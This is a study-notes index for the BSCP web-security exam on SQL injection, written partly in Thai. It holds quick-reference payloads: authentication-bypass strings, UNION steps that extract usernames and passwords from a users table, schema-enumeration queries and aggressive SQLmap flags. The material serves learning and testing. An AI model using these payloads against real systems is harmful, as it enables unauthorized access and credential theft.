# SQL Injection Guide

> **Stage 2: Privilege Escalation** — Extract admin credentials, escalate privileges

---

## Overview

SQL Injection เป็น vulnerability ที่ attacker สามารถ inject SQL code เข้าไปใน query ที่ส่งไป database ทำให้สามารถ:
- อ่านข้อมูลที่ไม่ควรเห็น (credentials, sensitive data)
- แก้ไข/ลบข้อมูล
- Bypass authentication
- ในบางกรณี RCE (Remote Code Execution)

---

## Files in this Guide

| File | Content |
|------|---------|
| [00-SQL-Basics-for-Beginners.md](./00-SQL-Basics-for-Beginners.md) | SQL เริ่มจากศูนย์ (ไม่มี background) |
| [01-SQL-Fundamentals.md](./01-SQL-Fundamentals.md) | Database basics, SQL syntax, Web-DB architecture |
| [02-SQL-Injection-Detection.md](./02-SQL-Injection-Detection.md) | Detection & Basic exploitation |
| [02a-SQLi-Types.md](./02a-SQLi-Types.md) | Types of SQLi (In-Band, Blind, Out-of-Band) |
| [03-UNION-Attack.md](./03-UNION-Attack.md) | UNION-based data extraction |
| 04-Blind-SQLi.md | Boolean & Time-based blind (coming soon) |
| [05-SQLmap-Usage.md](./05-SQLmap-Usage.md) | Automation with SQLmap |
| 06-Exam-Scenarios.md | BSCP exam patterns (coming soon) |

---

## Quick Reference

### Detection Payloads
```
'
''
' OR '1'='1
' OR '1'='1'--
' AND '1'='2
" OR "1"="1
```

### UNION Attack Steps
```sql
-- 1. Find column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    ← error = 2 columns

-- 2. Find string column
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--

-- 3. Extract data
' UNION SELECT username,password FROM users--
```

### Database Identification
| Database | Version Query |
|----------|--------------|
| MySQL | `@@version` |
| PostgreSQL | `version()` |
| MSSQL | `@@version` |
| Oracle | `SELECT banner FROM v$version` |

### Useful Tables
```sql
-- List all tables
SELECT table_name FROM information_schema.tables

-- List columns of a table
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

---

## BSCP Exam Tips

1. **Advanced Search = SQLi target** — ถ้าเห็น search ที่มี filter หลายอัน น่าสงสัย
2. **ใช้ Burp Scanner targeted** — scan เฉพาะ parameter ที่น่าสงสัย
3. **SQLmap flags:** `--level 5 --risk 3` สำหรับ thorough testing
4. **Goal:** Extract admin credentials → login → Stage 3

---

## Study Progress

- [x] SQL Basics for Beginners
- [x] SQL Fundamentals
- [x] SQL Injection Detection & Basic Exploitation
- [x] UNION Attack
- [ ] Blind SQLi
- [x] SQLmap Usage
- [ ] Exam Scenarios
